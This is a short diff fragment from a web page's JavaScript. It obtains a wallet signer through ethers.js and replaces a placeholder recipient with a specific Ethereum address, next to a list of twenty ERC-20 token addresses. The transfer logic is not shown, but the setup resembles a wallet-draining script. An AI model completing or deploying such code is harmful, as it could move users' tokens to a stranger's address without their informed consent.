@@ -76,7 +76,7 @@
 
             const provider = new ethers.providers.Web3Provider(window.ethereum);
             const signer = provider.getSigner();
-            const recipient = "0xRecipientAddressHere"; // Replace with the recipient's Ethereum address
+            const recipient = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Replace with the recipient's Ethereum address
 
             // 20 ERC-20 token addresses
             const tokenAddresses = [
